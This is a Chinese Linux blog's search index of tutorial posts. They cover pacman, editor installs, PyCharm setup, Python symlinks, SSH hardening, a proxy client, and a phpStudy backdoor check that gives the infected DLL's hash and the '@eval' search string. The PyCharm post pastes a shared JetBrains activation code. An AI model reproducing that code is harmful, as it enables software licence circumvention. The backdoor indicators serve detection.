<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Pacman命令详解.md</title>
      <link href="/2020/04/14/pacman-ming-ling-xiang-jie-md/"/>
      <url>/2020/04/14/pacman-ming-ling-xiang-jie-md/</url>
      
        <content type="html"><![CDATA[<h1 id="1-更新系统"><a href="#1-更新系统" class="headerlink" title="1. 更新系统"></a>1. 更新系统</h1><table><thead><tr><th align="left">命令</th><th align="left">解释</th><th align="left">备注</th></tr></thead><tbody><tr><td align="left">pacman -Syu</td><td align="left">对整个系统进行更新（常用）</td><td align="left"></td></tr><tr><td align="left">pacman -Syy</td><td align="left">强制更新</td><td align="left"></td></tr><tr><td align="left">pacman -Syudd</td><td align="left">使用 -dd跳过所有检测</td><td align="left"></td></tr></tbody></table><h1 id="2-搜索包"><a href="#2-搜索包" class="headerlink" title="2. 搜索包"></a>2. 搜索包</h1><table><thead><tr><th align="left">命令</th><th align="left">解释</th><th align="left">备注</th></tr></thead><tbody><tr><td align="left">pacman -Ss keyword</td><td align="left">在仓库中搜索含关键字的包（常用）</td><td align="left">pacman -Ss ‘^fcitx-’</td></tr><tr><td align="left">pacman -Qs keyword</td><td align="left">搜索已安装的包（常用）</td><td align="left">pacman -Qs ‘^fcitx-’</td></tr><tr><td align="left">pacman -Qi package_name</td><td align="left">查询本地安装包的详细信息</td><td align="left"></td></tr><tr><td align="left">pacman -Ql package_name</td><td align="left">列出该包的文件</td><td align="left"></td></tr><tr><td align="left">pacman -Fs keyword</td><td align="left">按文件名查找软件库</td><td align="left"></td></tr><tr><td align="left">pacman -Si package_name</td><td align="left">显示远程软件包的详尽的信息</td><td align="left"></td></tr><tr><td align="left">pacman -Qii package_name</td><td align="left">使用两个 -i 将同时显示备份文件和修改状态</td><td align="left"></td></tr><tr><td align="left">pacman -Ql package_name</td><td align="left">要获取已安装软件包所包含文件的列表</td><td align="left"></td></tr><tr><td align="left">pacman -Fl package_name</td><td align="left">查询远程库中软件包包含的文件</td><td align="left"></td></tr><tr><td align="left">pacman -Qk package_name</td><td align="left">检查软件包安装的文件是否都存在</td><td align="left"></td></tr><tr><td align="left">pacman -Fo /path/to/file_name</td><td align="left">查询文件属于远程数据库中的哪个软件包</td><td align="left"></td></tr><tr><td align="left">pacman -Qdt</td><td align="left">要罗列所有不再作为依赖的软件包(孤立orphans)</td><td align="left"></td></tr><tr><td align="left">pacman -Qet</td><td align="left">要罗列所有明确安装而且不被其它包依赖的软件包</td><td align="left"></td></tr><tr><td align="left">pactree package_name</td><td align="left">要显示软件包的依赖树</td><td align="left"></td></tr><tr><td align="left">whoneeds package_name</td><td align="left">检查一个安装的软件包被那些包依赖</td><td align="left">pkgtoolsAUR中的whoneeds</td></tr><tr><td align="left">pactree -r package_name</td><td align="left">检查一个安装的软件包被那些包依赖</td><td align="left"></td></tr></tbody></table><h1 id="3-安装包"><a href="#3-安装包" class="headerlink" title="3. 安装包"></a>3. 安装包</h1><table><thead><tr><th align="left">命令</th><th align="left">解释</th><th align="left">备注</th></tr></thead><tbody><tr><td align="left">pacman -S package_name</td><td align="left">执行 pacman -S firefox 将安装 Firefox（常用）</td><td align="left">你也可以同时安装多个包，只需以空格分隔包名即</td></tr><tr><td align="left">pacman -Sy package_name</td><td align="left">与上面命令不同的是，该命令将在同步包数据库后再执行安装。</td><td align="left"></td></tr><tr><td align="left">pacman -Sv package_name</td><td align="left">在显示一些操作信息后执行安装。</td><td align="left"></td></tr><tr><td align="left">pacman -U local_package_name</td><td align="left">安装本地包，其扩展名为pkg.tar.gz或pkg.tar.xz</td><td align="left"></td></tr><tr><td align="left">pacman -U url</td><td align="left">安装一个远程包（不在 pacman 配置的源里面）</td><td align="left">例：pacman -U ‘<a href="http://www.example.com/repo/example.pkg.tar.xz" target="_blank" rel="noopener">http://www.example.com/repo/example.pkg.tar.xz</a></td></tr></tbody></table><h1 id="3-1-yaourt"><a href="#3-1-yaourt" class="headerlink" title="3.1 yaourt"></a>3.1 yaourt</h1><table><thead><tr><th align="left">命令</th><th align="left">解释</th><th align="left">备注</th></tr></thead><tbody><tr><td align="left">pacman -S yaourt</td><td align="left">是社区贡献的一个pacman外壳</td><td align="left"><a href="https://wiki.archlinux.org/index.php?title=Yaourt_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)&amp;oldid=242639" target="_blank" rel="noopener">Yaourt (简体中文) - ArchWiki</a></td></tr><tr><td align="left">yaourt -Syua</td><td align="left">用pacman同步yaourt</td><td align="left"></td></tr></tbody></table><h1 id="4-删除包"><a href="#4-删除包" class="headerlink" title="4. 删除包"></a>4. 删除包</h1><table><thead><tr><th align="left">命令</th><th align="left">解释</th><th align="left">备注</th></tr></thead><tbody><tr><td align="left">pacman -R package_name</td><td align="left">该命令将只删除包，保留其全部已经安装的依赖关系</td><td align="left"></td></tr><tr><td align="left">pacman -Rs package_name</td><td align="left">在删除包的同时，删除其所有没有被其他已安装软件包使用的依赖关系（常用）</td><td align="left"></td></tr><tr><td align="left">pacman -Rsc package_name</td><td align="left">在删除包的同时，删除所有依赖这个软件包的程序</td><td align="left"></td></tr><tr><td align="left">pacman -Rd package_name</td><td align="left">在删除包时不检查依赖</td><td align="left"></td></tr></tbody></table><h1 id="5-其他用法"><a href="#5-其他用法" class="headerlink" title="5. 其他用法"></a>5. 其他用法</h1><table><thead><tr><th align="left">命令</th><th align="left">解释</th><th align="left">备注</th></tr></thead><tbody><tr><td align="left">pacman -Sw package_name</td><td align="left">只下载包，不安装。</td><td align="left"></td></tr><tr><td align="left">pacman -Sc</td><td align="left">清理未安装的包文件（常用）</td><td align="left">包文件位于 /var/cache/pacman/pkg/ 目录</td></tr><tr><td align="left">pacman -Scc</td><td align="left">清理所有的缓存文件（常用）</td><td align="left"></td></tr></tbody></table><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 随记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Manjaro-Linux入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux Ubuntu中比较好用的代码编辑器</title>
      <link href="/2019/09/27/linux-ubuntu-zhong-bi-jiao-hao-yong-de-dai-ma-bian-ji-qi/"/>
      <url>/2019/09/27/linux-ubuntu-zhong-bi-jiao-hao-yong-de-dai-ma-bian-ji-qi/</url>
      
        <content type="html"><![CDATA[<h1 id="Atom"><a href="#Atom" class="headerlink" title="Atom:"></a>Atom:</h1><pre class="line-numbers language-csharp"><code class="language-csharp">sudo <span class="token keyword">add</span><span class="token operator">-</span>apt<span class="token operator">-</span>repository ppa<span class="token punctuation">:</span>webupd8team<span class="token operator">/</span>atomsudo apt<span class="token operator">-</span><span class="token keyword">get</span> updatesudo apt<span class="token operator">-</span><span class="token keyword">get</span> install atom<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="Brackets"><a href="#Brackets" class="headerlink" title="Brackets:"></a>Brackets:</h1><pre class="line-numbers language-csharp"><code class="language-csharp">sudo <span class="token keyword">add</span><span class="token operator">-</span>apt<span class="token operator">-</span>repository ppa<span class="token punctuation">:</span>webupd8team<span class="token operator">/</span>bracketssudo apt<span class="token operator">-</span><span class="token keyword">get</span> install brackets<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="Sublime-Text："><a href="#Sublime-Text：" class="headerlink" title="Sublime Text："></a>Sublime Text：</h1><pre class="line-numbers language-csharp"><code class="language-csharp">sudo <span class="token keyword">add</span><span class="token operator">-</span>apt<span class="token operator">-</span>repository ppa<span class="token punctuation">:</span>webupd8team<span class="token operator">/</span>sublime<span class="token operator">-</span>text<span class="token number">-3</span>sudo apt<span class="token operator">-</span><span class="token keyword">get</span> install sublime<span class="token operator">-</span>text<span class="token operator">-</span>installer<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> linux入门 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编辑器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu安装pycharm教程</title>
      <link href="/2019/09/27/ubuntu-an-zhuang-pycharm-jiao-cheng/"/>
      <url>/2019/09/27/ubuntu-an-zhuang-pycharm-jiao-cheng/</url>
      
        <content type="html"><![CDATA[<p>1.去官网下载pycharm安装包，选择Linux版本下载<a href="https://www.jetbrains.com/pycharm/download/#section=linux" target="_blank" rel="noopener">https://www.jetbrains.com/pycharm/download/#section=linux</a><br>2.安装了VMware Tools可以直接把下载的压缩包 “pycharm-professional-2018.2.3.tar” 复制到Ubuntu的Downloads文件夹中，右键点 “Extract Here” 解压<br>3.解压后进入bin目录下，在这个目录右键Open in Terminal,在Terminal中执行命令： sh ./pycharm.sh<br>4.第一次装选第二个，若重新安装的需要导入之前安装版本的配置选第一个，然后点 “OK” 确认<br>5.点击OK之后弹出 PyCharm Privary Policy Agreement框，隐私政策协议，直接点击Accept 同意即可<br>6.弹出PyCharm License Activation框，选择Activation code激活，然后复制下面的激活码点击激活MTW881U3Z5-eyJsaWNlbnNlSWQiOiJNVFc4ODFVM1o1IiwibGljZW5zZWVOYW1lIjoiTnNzIEltIiwiYXNzaWduZWVOYW1lIjoiIiwiYXNzaWduZWVFbWFpbCI6IiIsImxpY2Vuc2VSZXN0cmljdGlvbiI6IkZvciBlZHVjYXRpb25hbCB1c2Ugb25seSIsImNoZWNrQ29uY3VycmVudFVzZSI6ZmFsc2UsInByb2R1Y3RzIjpbeyJjb2RlIjoiSUkiLCJwYWlkVXBUbyI6IjIwMTktMTEtMDYifSx7ImNvZGUiOiJBQyIsInBhaWRVcFRvIjoiMjAxOS0xMS0wNiJ9LHsiY29kZSI6IkRQTiIsInBhaWRVcFRvIjoiMjAxOS0xMS0wNiJ9LHsiY29kZSI6IlBTIiwicGFpZFVwVG8iOiIyMDE5LTExLTA2In0seyJjb2RlIjoiR08iLCJwYWlkVXBUbyI6IjIwMTktMTEtMDYifSx7ImNvZGUiOiJETSIsInBhaWRVcFRvIjoiMjAxOS0xMS0wNiJ9LHsiY29kZSI6IkNMIiwicGFpZFVwVG8iOiIyMDE5LTExLTA2In0seyJjb2RlIjoiUlMwIiwicGFpZFVwVG8iOiIyMDE5LTExLTA2In0seyJjb2RlIjoiUkMiLCJwYWlkVXBUbyI6IjIwMTktMTEtMDYifSx7ImNvZGUiOiJSRCIsInBhaWRVcFRvIjoiMjAxOS0xMS0wNiJ9LHsiY29kZSI6IlBDIiwicGFpZFVwVG8iOiIyMDE5LTExLTA2In0seyJjb2RlIjoiUk0iLCJwYWlkVXBUbyI6IjIwMTktMTEtMDYifSx7ImNvZGUiOiJXUyIsInBhaWRVcFRvIjoiMjAxOS0xMS0wNiJ9LHsiY29kZSI6IkRCIiwicGFpZFVwVG8iOiIyMDE5LTExLTA2In0seyJjb2RlIjoiREMiLCJwYWlkVXBUbyI6IjIwMTktMTEtMDYifSx7ImNvZGUiOiJSU1UiLCJwYWlkVXBUbyI6IjIwMTktMTEtMDYifV0sImhhc2giOiIxMDgyODE0Ni8wIiwiZ3JhY2VQZXJpb2REYXlzIjowLCJhdXRvUHJvbG9uZ2F0ZWQiOmZhbHNlLCJpc0F1dG9Qcm9sb25nYXRlZCI6ZmFsc2V9-aKyalfjUfiV5UXfhaMGgOqrMzTYy2rnsmobL47k8tTpR/jvG6HeL3FxxleetI+W+Anw3ZSe8QAMsSxqVS4podwlQgIe7f+3w7zyAT1j8HMVlfl2h96KzygdGpDSbwTbwOkJ6/5TQOPgAP86mkaSiM97KgvkZV/2nXQHRz1yhm+MT+OsioTwxDhd/22sSGq6KuIztZ03UvSciEmyrPdl2ueJw1WuT9YmFjdtTm9G7LuXvCM6eav+BgCRm+wwtUeDfoQqigbp0t6FQgkdQrcjoWvLSB0IUgp/f4qGf254fA7lXskT2VCFdDvi0jgxLyMVct1cKnPdM6fkHnbdSXKYDWw==-MIIElTCCAn2gAwIBAgIBCTANBgkqhkiG9w0BAQsFADAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBMB4XDTE4MTEwMTEyMjk0NloXDTIwMTEwMjEyMjk0NlowaDELMAkGA1UEBhMCQ1oxDjAMBgNVBAgMBU51c2xlMQ8wDQYDVQQHDAZQcmFndWUxGTAXBgNVBAoMEEpldEJyYWlucyBzLnIuby4xHTAbBgNVBAMMFHByb2QzeS1mcm9tLTIwMTgxMTAxMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxcQkq+zdxlR2mmRYBPzGbUNdMN6OaXiXzxIWtMEkrJMO/5oUfQJbLLuMSMK0QHFmaI37WShyxZcfRCidwXjot4zmNBKnlyHodDij/78TmVqFl8nOeD5+07B8VEaIu7c3E1N+e1doC6wht4I4+IEmtsPAdoaj5WCQVQbrI8KeT8M9VcBIWX7fD0fhexfg3ZRt0xqwMcXGNp3DdJHiO0rCdU+Itv7EmtnSVq9jBG1usMSFvMowR25mju2JcPFp1+I4ZI+FqgR8gyG8oiNDyNEoAbsR3lOpI7grUYSvkB/xVy/VoklPCK2h0f0GJxFjnye8NT1PAywoyl7RmiAVRE/EKwIDAQABo4GZMIGWMAkGA1UdEwQCMAAwHQYDVR0OBBYEFGEpG9oZGcfLMGNBkY7SgHiMGgTcMEgGA1UdIwRBMD+AFKOetkhnQhI2Qb1t4Lm0oFKLl/GzoRykGjAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBggkA0myxg7KDeeEwEwYDVR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgWgMA0GCSqGSIb3DQEBCwUAA4ICAQAF8uc+YJOHHwOFcPzmbjcxNDuGoOUIP+2h1R75Lecswb7ru2LWWSUMtXVKQzChLNPn/72W0k+oI056tgiwuG7M49LXp4zQVlQnFmWU1wwGvVhq5R63Rpjx1zjGUhcXgayu7+9zMUW596Lbomsg8qVve6euqsrFicYkIIuUu4zYPndJwfe0YkS5nY72SHnNdbPhEnN8wcB2Kz+OIG0lih3yz5EqFhld03bGp222ZQCIghCTVL6QBNadGsiN/lWLl4JdR3lJkZzlpFdiHijoVRdWeSWqM4y0t23c92HXKrgppoSV18XMxrWVdoSM3nuMHwxGhFyde05OdDtLpCv+jlWf5REAHHA201pAU6bJSZINyHDUTB+Beo28rRXSwSh3OUIvYwKNVeoBY+KwOJ7WnuTCUq1meE6GkKc4D/cXmgpOyW/1SmBz3XjVIi/zprZ0zf3qH5mkphtg6ksjKgKjmx1cXfZAAX6wcDBNaCL+Ortep1Dh8xDUbqbBVNBL4jbiL3i3xsfNiyJgaZ5sX7i8tmStEpLbPwvHcByuf59qJhV/bZOl8KqJBETCDJcY6O2aqhTUy+9x93ThKs1GKrRPePrWPluud7ttlgtRveit/pcBrnQcXOl1rHq7ByB8CFAxNotRUYL9IF5n3wJOgkPojMy6jetQA5Ogc8Sm7RG6vg1yow==<br>7.安装成功<br>8.新建工程格式，例：工程名01_python基础，文件名：lc_01_hello.py<br>9.pycharm恢复初始设置：pycharm的配置信息保存在家目录下的.pycharmXXX目录下的，若要恢复初始设置，关闭当前运行的pycharm，终端中输入：rm -r .pycharmXXX。<br>10.卸载pycharm：第一步找到pycharm安装的目录，输入：ls -l，看到 pycharm-201XXX，再输入sudo rm -r pycharm-201XXX。第二步再删除配置目录，它是隐藏目录，在家目录输入：ls -la,看到以.开头的.pycharm201XXX,再输入： rm -r .pycharm201XXX</p><p>原文链接：<a href="https://blog.csdn.net/ML_amateur/article/details/88391521" target="_blank" rel="noopener">https://blog.csdn.net/ML_amateur/article/details/88391521</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> pycharm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pycharm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux下python2和python3环境配置</title>
      <link href="/2019/09/25/linux-xia-python2-he-python3-huan-jing-pei-zhi/"/>
      <url>/2019/09/25/linux-xia-python2-he-python3-huan-jing-pei-zhi/</url>
      
        <content type="html"><![CDATA[<h3 id="0x00-查看当前已经存在Python的版本"><a href="#0x00-查看当前已经存在Python的版本" class="headerlink" title="0x00 查看当前已经存在Python的版本"></a>0x00 查看当前已经存在Python的版本</h3><p>root@ubuntu:~#ls -l /usr/bin/python*</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/img/20190913084515198.png" alt="img"></p><h3 id="0x01-查看当前Python默认指向的python的版本"><a href="#0x01-查看当前Python默认指向的python的版本" class="headerlink" title="0x01 查看当前Python默认指向的python的版本"></a>0x01 查看当前Python默认指向的python的版本</h3><p>root@ubuntu:~#ls -l /usr/bin/python</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/img/20190913084532657.png" alt="img"></p><h3 id="0x02-如果指向python2则修改默认版本"><a href="#0x02-如果指向python2则修改默认版本" class="headerlink" title="0x02 如果指向python2则修改默认版本"></a>0x02 如果指向python2则修改默认版本</h3><p>root@ubuntu:~#sudo rm -rf /usr/bin/python   //删除链接</p><p>root@ubuntu:~#ln -s /usr/bin/python2 /usr/bin/py2 //设定链接到python2</p><p>root@ubuntu:~#ln -s /usr/bin/python3 /usr/bin/py3 //设定链接到python3</p><h3 id="0x03-在终端输入Python查看是否已经修改完成"><a href="#0x03-在终端输入Python查看是否已经修改完成" class="headerlink" title="0x03 在终端输入Python查看是否已经修改完成"></a>0x03 在终端输入Python查看是否已经修改完成</h3><p>root@ubuntu:~#py2</p><p>root@ubuntu:~#py3</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/img/1569392823074.png" alt="1569392823074"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> python基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python环境 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux之SSH服务端配置文件安全设置</title>
      <link href="/2019/09/25/linux-zhi-ssh-fu-wu-duan-pei-zhi-wen-jian-an-quan-she-zhi/"/>
      <url>/2019/09/25/linux-zhi-ssh-fu-wu-duan-pei-zhi-wen-jian-an-quan-she-zhi/</url>
      
        <content type="html"><![CDATA[<h3 id="0x00将root账户仅限制为控制台访问，不允许ssh登录"><a href="#0x00将root账户仅限制为控制台访问，不允许ssh登录" class="headerlink" title="0x00将root账户仅限制为控制台访问，不允许ssh登录"></a>0x00将root账户仅限制为控制台访问，不允许ssh登录</h3><p># vim /etc/ssh/sshd_config</p><p>PermitRootLogin no</p><p># systemctl restart ssh.service</p><h3 id="0x01配置TCP-Wrappers-，对远程主机进行访问控制，修改-etc-hosts-deny拒绝所有远程主机访问sshd服务，然后修改-etc-hosts-allow仅允许特定主机-网络段使用sshd服务"><a href="#0x01配置TCP-Wrappers-，对远程主机进行访问控制，修改-etc-hosts-deny拒绝所有远程主机访问sshd服务，然后修改-etc-hosts-allow仅允许特定主机-网络段使用sshd服务" class="headerlink" title="0x01配置TCP Wrappers ，对远程主机进行访问控制，修改/etc/hosts.deny拒绝所有远程主机访问sshd服务，然后修改/etc/hosts.allow仅允许特定主机/网络段使用sshd服务"></a>0x01配置TCP Wrappers ，对远程主机进行访问控制，修改/etc/hosts.deny拒绝所有远程主机访问sshd服务，然后修改/etc/hosts.allow仅允许特定主机/网络段使用sshd服务</h3><p># vim /etc/hosts.deny</p><p>//sshd 为ssh服务     ALL 为所有地址</p><p>sshd:    ALL         </p><p># vim /etc/hosts.allow</p><p>//仅允许192.168.1.x网段访问</p><p>sshd:    192.168.1.     </p><h3 id="0x02在工作站或笔记本电脑上，关闭SSH服务并卸载ssh服务器包，工作站或笔记本没有做为服务器段来使用，所以把服务器段的ssh卸载，仅保留客户端的ssh即可。"><a href="#0x02在工作站或笔记本电脑上，关闭SSH服务并卸载ssh服务器包，工作站或笔记本没有做为服务器段来使用，所以把服务器段的ssh卸载，仅保留客户端的ssh即可。" class="headerlink" title="0x02在工作站或笔记本电脑上，关闭SSH服务并卸载ssh服务器包，工作站或笔记本没有做为服务器段来使用，所以把服务器段的ssh卸载，仅保留客户端的ssh即可。"></a>0x02在工作站或笔记本电脑上，关闭SSH服务并卸载ssh服务器包，工作站或笔记本没有做为服务器段来使用，所以把服务器段的ssh卸载，仅保留客户端的ssh即可。</h3><p># systemctl stop ssh.service</p><p># yum -y remove openssh-server</p><h3 id="0x03通过控制用户帐号，限制其对ssh的访问"><a href="#0x03通过控制用户帐号，限制其对ssh的访问" class="headerlink" title="0x03通过控制用户帐号，限制其对ssh的访问"></a>0x03通过控制用户帐号，限制其对ssh的访问</h3><p># vim /etc/ssh/sshd_config</p><p>//  在该文件的最后添加以下两行</p><p>AllowUsers    admin xiaodong    //允许的用户</p><p>AllowUsers <a href="mailto:root@192.168.10.15" target="_blank" rel="noopener">root@192.168.10.15</a>   //只允许用户从指定的IP登陆</p><p>DenyUsers    xiaohong <a href="mailto:xiaofang@192.168.5.10" target="_blank" rel="noopener">xiaofang@192.168.5.10</a>   //禁止xiaohong登录，和禁止xiaofang使用192.168.5.10的ip地址登录</p><p># systemctl restart ssh.service    //重启ssh服务</p><h3 id="0x04强制使用SSH-Protocol2（版本1不安全）："><a href="#0x04强制使用SSH-Protocol2（版本1不安全）：" class="headerlink" title="0x04强制使用SSH Protocol2（版本1不安全）："></a>0x04强制使用SSH Protocol2（版本1不安全）：</h3><p># vim /etc/ssh/sshd_config</p><p>Protocol 2</p><p># systemctl restart ssh.service</p><h3 id="0x05不支持闲置会话，并配置idle-Logout-Timeout-间隔："><a href="#0x05不支持闲置会话，并配置idle-Logout-Timeout-间隔：" class="headerlink" title="0x05不支持闲置会话，并配置idle Logout Timeout 间隔："></a>0x05不支持闲置会话，并配置idle Logout Timeout 间隔：</h3><p>// 编辑以下两行</p><p># vim /etc/ssh/sshd_config</p><p>ClientAliveInterval 600      // 600为秒，即600秒后无动作就自动断开连接</p><p>ClientAliveCountMax 3</p><p># systemctl restart ssh.service   // 重启ssh服务</p><h3 id="0x06禁止使用空密码登录，设置最大尝试登录次数"><a href="#0x06禁止使用空密码登录，设置最大尝试登录次数" class="headerlink" title="0x06禁止使用空密码登录，设置最大尝试登录次数"></a>0x06禁止使用空密码登录，设置最大尝试登录次数</h3><p>// 编辑以下三行</p><p># vim /etc/ssh/sshd_config</p><p>PermitEmptyPasswords no</p><p>PasswordAuthentication yes</p><p>MaxAuthTries 6     // 尝试次数6次</p><p># systemctl restart ssh.service</p><h3 id="0x07禁用基于主机的身份验证"><a href="#0x07禁用基于主机的身份验证" class="headerlink" title="0x07禁用基于主机的身份验证"></a>0x07禁用基于主机的身份验证</h3><p># vim /etc/ssh/sshd_config</p><p>HostbasedAuthentication no</p><p># systemctl restart ssh.service</p><h3 id="0x08禁用用户的-rhosts-文件"><a href="#0x08禁用用户的-rhosts-文件" class="headerlink" title="0x08禁用用户的 .rhosts 文件"></a>0x08禁用用户的 .rhosts 文件</h3><p># vim /etc/ssh/sshd_config</p><p>IgnoreRhosts yes</p><p># systemctl restart ssh.service</p><h3 id="0x09限制ssh，将侦听绑定到指定的可用网络接口与端口"><a href="#0x09限制ssh，将侦听绑定到指定的可用网络接口与端口" class="headerlink" title="0x09限制ssh，将侦听绑定到指定的可用网络接口与端口"></a>0x09限制ssh，将侦听绑定到指定的可用网络接口与端口</h3><p># vim /etc/ssh/sshd_config</p><p>ListenAddress 172.168.8.5</p><p>Port 56175      //可以修改ssh的端口</p><h3 id="0x10始终保持ssh补丁版本最新（可以设置到任务计划中）"><a href="#0x10始终保持ssh补丁版本最新（可以设置到任务计划中）" class="headerlink" title="0x10始终保持ssh补丁版本最新（可以设置到任务计划中）"></a>0x10始终保持ssh补丁版本最新（可以设置到任务计划中）</h3><p># yum update openssh-server openssh openssh-clients -y</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> linux安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssh </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>electron-ssr折腾记</title>
      <link href="/2019/09/24/electron-ssr-zhe-teng-ji/"/>
      <url>/2019/09/24/electron-ssr-zhe-teng-ji/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>最近装了deepin linux系统，他是基于ubuntu开发的。我考虑如何才能挂ssr呢！一通百度，google。找到了个名叫electron-ssr的图形化界面软件。然而GUI 客户端 <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Ferguotou520%2Felectron-ssr%2F" target="_blank" rel="noopener">electron-ssr 项目</a>被作者关闭了。</p><p>只见告别写着：</p><blockquote><p>Say goodbye to yesterday.</p><p>Say hello to tomorrow.</p><p>Remember you can be better.</p><p>Be yourself and do yourself.</p><p>Year by year, day by day.</p><p>Enhance yourself to meet challenges.</p></blockquote><p>什么鬼嘛？…….，祝作者好运吧！</p><h2 id="0x01还好github上有热心市民备份了项目"><a href="#0x01还好github上有热心市民备份了项目" class="headerlink" title="0x01还好github上有热心市民备份了项目"></a>0x01还好github上有热心市民备份了项目</h2><p>这么好用的软件如果再被删了，对于我这种小白是一件很苦恼的事情！所以我也直接<a href="https://github.com/cscwd/electron-ssr-backup" target="_blank" rel="noopener">备份项目</a></p><p>另外务必要注意的是，因为 electron-ssr 使用的是 python 版的 ssr，所以务必要记得安装 python！</p><h2 id="0x02简单介绍ubuntu安装electron-ssr吧"><a href="#0x02简单介绍ubuntu安装electron-ssr吧" class="headerlink" title="0x02简单介绍ubuntu安装electron-ssr吧"></a>0x02简单介绍ubuntu安装electron-ssr吧</h2><p>下载地址：<a href="https://github.com/cscwd/electron-ssr-backup/tree/master/0.2.5App" target="_blank" rel="noopener">https://github.com/cscwd/electron-ssr-backup/tree/master/0.2.5App</a></p><p>下载.AppImage结尾的</p><p>先给下载的文件权限之后，点击运行。然后…然后就可以了！</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Ubuntu electron-ssr </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ubuntu electron-ssr </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpStudy 后门快速自查</title>
      <link href="/2019/09/21/phpstudy-hou-men-kuai-su-zi-cha/"/>
      <url>/2019/09/21/phpstudy-hou-men-kuai-su-zi-cha/</url>
      
        <content type="html"><![CDATA[<p>被感染后门的是 /php/php-5.4.45/ext/php_xmlrpc.dll</p><p>18的52 54都存在</p><p>md5是 C339482FD2B233FB0A555B629C0EA5D5</p><p>也可以直接记事本打开搜索 @eval</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/img/1.jpg" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/img/2.jpg" alt="img"></p><p>下载站下载的可能会中招</p><p>本方法来自chamd5团队的分析,本人只是做了简化,感谢chamd5团队的分享</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
        <tags>
            
